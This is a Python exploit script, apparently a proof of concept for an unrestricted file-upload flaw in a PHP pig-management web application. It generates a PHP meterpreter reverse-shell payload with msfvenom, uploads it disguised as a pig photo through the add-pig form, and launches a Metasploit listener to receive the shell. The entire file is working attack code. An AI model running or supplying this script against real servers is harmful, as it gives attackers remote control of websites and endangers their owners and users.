import os
import subprocess
import tempfile
import requests

def generate_php_payload(lhost, lport):
    payload_path = "reverse.php"
    cmd = [
        "msfvenom", "-p", "php/meterpreter/reverse_tcp",
        f"LHOST={lhost}", f"LPORT={lport}", "-f", "raw", "-o", payload_path
    ]
    subprocess.run(cmd, check=True)
    print(f"Payload generated at {payload_path}")
    return payload_path

def upload_file(url, data, files):
    response = requests.post(url, data=data, files=files)
    if response.status_code == 200:
        print("File uploaded successfully.")
    else:
        print("Failed to upload file.")
    return response

def setup_metasploit_listener(lhost, lport):
    with tempfile.NamedTemporaryFile(delete=False) as resource_file:
        resource_file.write(f"""
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {lport}
exploit
""".strip().encode('utf-8'))
        resource_path = resource_file.name
    
    try:
        cmd = ["msfconsole", "-r", resource_path]
        subprocess.run(cmd, check=True, text=True)
    finally:
        os.remove(resource_path)


def main():
    lhost = "127.0.0.1"  
    lport = "4444"
    upload_url = "http://localhost/pig/add-pig.php"
    data = {
        'submit': 'Upload',
        'pigno': '1234',
        'weight': '150',
        'arrived': '2024-07-04',
        'breed': 'Duroc',
        'remark': 'Healthy',
        'status': 'Good',
        'gender': 'Male'
    }

    print("Generating PHP payload...")
    payload_path = generate_php_payload(lhost, lport)

    print("Uploading payload...")
    files = {
        'pigphoto': ('reverse.php', open(payload_path, 'rb'), 'application/x-php')
    }
    upload_response = upload_file(upload_url, data, files)

    print("Setting up Metasploit listener...")
    setup_metasploit_listener(lhost, lport)

    print(f"Upload the PHP payload to the vulnerable application and trigger it.")
    print(f"Payload URL: {upload_url}")

main()
